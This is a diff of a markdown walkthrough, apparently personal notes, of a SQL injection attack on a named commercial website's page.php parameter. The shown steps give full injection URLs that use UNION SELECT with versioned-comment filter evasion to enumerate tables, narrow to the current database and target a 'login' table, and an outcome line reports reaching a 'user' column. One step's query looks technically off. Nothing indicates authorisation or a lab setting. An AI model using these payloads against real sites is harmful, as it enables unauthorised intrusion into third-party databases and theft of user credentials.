@@ -44,16 +44,16 @@ https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2
 outcome : CHARACTER_SETS
 the outcome is not as expected.
 
-#### Step 08 : using "group_concat" to get the all database 
+#### Step 08 : using "group_concat"
 https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,group_concat(table_name)%20/*!12312from*/%20/*!information_schema.tables*/%20--+
 
-#### Step 09 : filtering out the database as it has too much data, so filtering out basis of data that is related aboutus,contacts,inquiry_carts,login,main_banner,main_cat,news,products,quality,setting...
+#### Step 09 : filtering out the database 
+aboutus,contacts,inquiry_carts,login,main_banner,main_cat,news,products,quality,setting...
 https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,group_concat(table_name)%20/*!12312from*/%20/*!information_schema.tables*/%20/*!12312where*/%20/*!12312table_schema*/%20=%20database()%20--+
 
 outcome : saw a section called login, going for the view
 
 #### Step 10 : selected the login
-
 https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,column_name%20/*!12312from*/%20/*!information_schema.tables*/%20/*!12312where*/%20/*!12312table_name*/%20=%20%27login%27%20--+
 
 outcome : "user"
